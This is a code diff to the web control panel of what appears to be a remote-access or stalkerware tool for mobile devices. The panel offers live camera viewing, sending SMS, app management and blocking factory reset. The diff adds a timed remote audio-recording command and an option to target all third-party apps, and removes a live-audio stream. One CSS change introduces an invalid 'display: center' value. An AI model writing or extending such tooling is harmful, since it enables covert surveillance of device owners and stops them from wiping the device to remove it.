@@ -287,7 +287,7 @@
             border: 1px solid var(--border);
             display: none;
         }
-        .location-title { font-size: 0.85rem; font-weight: 700; color: var(--accent); margin-bottom: 4px; display: flex; align-items: center; gap: 5px; }
+        .location-title { font-size: 0.85rem; font-weight: 700; color: var(--accent); margin-bottom: 4px; display: center; align-items: center; gap: 5px; }
         .location-text { font-family: monospace; font-size: 0.9rem; color: var(--text-main); }
         .maps-btn { display: inline-block; margin-top: 8px; color: var(--accent); text-decoration: none; font-size: 0.75rem; font-weight: 600; border: 1px solid var(--accent); padding: 4px 8px; border-radius: 4px; }
         .maps-btn:hover { background: var(--accent); color: #0f172a; }
@@ -352,7 +352,6 @@
                     <div class="live-screen-container">
                         <div id="camSpinner" class="spinner"></div>
                         <img id="liveScreen" class="rotate-0" src="" alt="Stream Offline" />
-                        <audio id="liveAudio" autoplay></audio>
                     </div>
                 </div>
 
@@ -397,6 +396,12 @@
                 <!-- App Management -->
                 <div class="card">
                     <h2>App Management</h2>
+                    <div style="display: flex; align-items: center; margin-bottom: 10px; gap: 10px;">
+                        <label style="display: flex; align-items: center; gap: 5px; cursor: pointer; color: var(--accent); font-weight: bold;">
+                            <input type="checkbox" id="allThirdPartyApps" style="width: 16px; height: 16px;" onchange="toggleAllThirdParty()">
+                            ALL 3RD PARTY
+                        </label>
+                    </div>
                     <div class="flex-row">
                         <input type="text" id="targetPackage" placeholder="com.package.name">
                         <button onclick="sendCommand('list_apps')">List</button>
@@ -430,6 +435,12 @@
                         <input type="text" id="smsNumber" placeholder="Number" style="flex:0.4">
                         <input type="text" id="smsMsg" placeholder="Message">
                         <button class="action" onclick="sendCommand('sms', {number: document.getElementById('smsNumber').value, message: document.getElementById('smsMsg').value})">Send</button>
+                    </div>
+                    <hr>
+                    <label>Record Audio</label>
+                    <div class="flex-row">
+                        <input type="number" id="recDur" value="10000" placeholder="ms">
+                        <button class="action" onclick="sendCommand('record_audio', {duration: parseInt(document.getElementById('recDur').value)})">Record</button>
                     </div>
                 </div>
 
@@ -484,7 +495,7 @@
                         </div>
                     </div>
                     <div class="control-group">
-                        <label>Factory Reset</label>
+                        <label>Reset and Dev</label>
                         <div class="btn-toggle">
                             <button id="btn_factory_allow" onclick="sendCommand('factory_reset_block', {block: false})">Allow</button>
                             <button id="btn_factory_block" onclick="sendCommand('factory_reset_block', {block: true})">Block</button>
@@ -618,6 +629,18 @@
             }
         }
 
+        function toggleAllThirdParty() {
+            const isChecked = document.getElementById('allThirdPartyApps').checked;
+            const input = document.getElementById('targetPackage');
+            if (isChecked) {
+                input.value = "all_third_party";
+                input.disabled = true;
+            } else {
+                input.value = "";
+                input.disabled = false;
+            }
+        }
+
         function showError(msg) {
             const el = document.getElementById('errorLog');
             el.innerText = msg;
@@ -638,7 +661,6 @@
             const camId = document.getElementById('cameraIdSelect').value;
             const spinner = document.getElementById('camSpinner');
             const img = document.getElementById('liveScreen');
-            const audio = document.getElementById('liveAudio');
 
             if (enable) {
                 isFeedEnabled = true;
@@ -651,17 +673,11 @@
                     window.streamLoopRunning = true;
                     updateLiveStream();
                 }
-
-                // Audio setup
-                const deviceId = document.getElementById('deviceSelect').value;
-                audio.src = `/live-audio?deviceId=${deviceId}&t=${Date.now()}`;
-                audio.play().catch(e => console.log("Audio autoplay blocked"));
             } else {
                 isFeedEnabled = false;
                 spinner.style.display = 'none';
                 img.style.display = 'none';
                 img.src = "";
-                audio.src = "";
                 await sendCommand('live_camera', {enabled: false});
             }
 
@@ -711,6 +727,8 @@
                 const div = document.createElement('div');
                 div.className = 'app-item';
                 div.onclick = () => {
+                    document.getElementById('allThirdPartyApps').checked = false;
+                    document.getElementById('targetPackage').disabled = false;
                     document.getElementById('targetPackage').value = app.package;
                     div.style.background = 'rgba(56, 189, 248, 0.2)';
                     setTimeout(() => div.style.background = '', 200);
